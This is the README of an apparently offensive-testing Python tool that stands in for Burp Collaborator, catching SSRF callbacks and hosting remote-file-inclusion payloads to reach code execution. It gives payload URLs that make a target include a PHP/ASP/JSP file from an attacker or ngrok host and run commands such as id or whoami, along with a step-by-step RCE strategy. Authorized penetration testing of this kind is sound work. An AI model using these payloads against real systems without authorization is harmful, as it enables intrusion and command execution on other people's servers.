# 🔥 python-burp-collaborator

A lightweight, single-file Python tool that works as a **Burp Collaborator alternative** for both **internal and external SSRF/RFI testing**.

It provides:

* SSRF callback detection
* RFI → RCE payload hosting
* Multi-language payload support
* Clean proof-of-concept logging

> 💡 If you're using **Burp Suite Community Edition** (no built-in collaborator), this tool can act as your **own collaborator server**.

---

# ⚠️ Disclaimer

Use this tool **only in authorized environments**.

---

# 🚀 Features

* SSRF listener with token tracking
* Multi-payload RFI server (`.php`, `.asp`, `.aspx`, `.jsp`, `.txt`)
* Cross-platform command execution (Linux + Windows)
* Works:

  * Internal network ✔
  * External testing ✔ (via ngrok)

---

# 🛠 Requirements

* Python 3
* (Optional) ngrok for external testing

---

# ▶️ Usage

---

# 🧪 🔹 INTERNAL TESTING (Same Network / VPN)

## Step 1 — Find Your IP

```bash id="3o6n9g"
ipconfig     # Windows
ifconfig     # Linux
```

Example:

```
192.168.1.50
```

---

## Step 2 — Run Tool

```bash id="0j4z6z"
python ssrf_rfi_tool.py --ip 192.168.1.50
```

---

## Step 3 — Use Payloads

### SSRF

```
http://target/api?url=http://192.168.1.50:8000/<TOKEN>
```

---

### RFI Detection

```
http://target/page.php?file=http://192.168.1.50:9000/rfi.txt
```

---

### 🔥 RFI → RCE

Linux:

```
http://target/page.php?file=http://192.168.1.50:9000/rfi.php&cmd=id
```

Windows:

```
http://target/page.php?file=http://192.168.1.50:9000/rfi.php&cmd=whoami
```

---

## ✅ Expected Output

```
START
uid=33(www-data)
END
```

---

# 🌐 🔹 EXTERNAL TESTING (Internet Targets)

## ⚠️ Important

Your local IP (192.168.x.x) is **NOT reachable from internet targets**.

You MUST expose your tool.

---

## Step 1 — Run Tool Locally

```bash id="c91d2c"
python ssrf_rfi_tool.py --ip 127.0.0.1
```

---

## Step 2 — Start ngrok

Run **2 tunnels**:

```bash id="xtj5ra"
ngrok http 8000
ngrok http 9000
```

---

## Step 3 — Get Public URLs

Example:

```
https://abc123.ngrok.io   → SSRF
https://xyz456.ngrok.io   → RFI
```

---

## Step 4 — Use Payloads

### SSRF

```
http://target/api?url=https://abc123.ngrok.io/<TOKEN>
```

---

### RFI Detection

```
http://target/page.php?file=https://xyz456.ngrok.io/rfi.txt
```

---

### 🔥 RFI → RCE

Linux:

```
http://target/page.php?file=https://xyz456.ngrok.io/rfi.php&cmd=id
```

Windows:

```
http://target/page.php?file=https://xyz456.ngrok.io/rfi.php&cmd=whoami
```

---

## ✅ SSRF Proof

```
[🔥 SSRF CALLBACK RECEIVED]
Source: <TARGET_SERVER_IP>
```

---

# 🔁 Internal → External Mapping

| Internal                 | External             |
| ------------------------ | -------------------- |
| http://192.168.1.50:8000 | https://abc.ngrok.io |
| http://192.168.1.50:9000 | https://xyz.ngrok.io |

---

# 🧠 Testing Strategy

1. Start with `.txt` → confirm inclusion
2. Try `.php` → attempt RCE
3. Rotate extensions
4. Execute commands
5. Capture output

---

# 💣 Limitations

* No DNS-based SSRF detection
* No HTTPS server (ngrok solves this)
* No WAF bypass automation

---

* Always prove **RCE**, not just inclusion

---

# 📄 Example Finding

**Vulnerability:** RFI → RCE

**Proof:**

```
http://target/page.php?file=https://attacker/rfi.php&cmd=id
```

---

# 🛑 Final Note

If you're only seeing:

```
RFI_TEST_SUCCESS
```

👉 That’s detection only.

If you see:

```
uid=www-data
```

👉 That’s impact.

---

# 👨‍💻 Author

**who cares?**
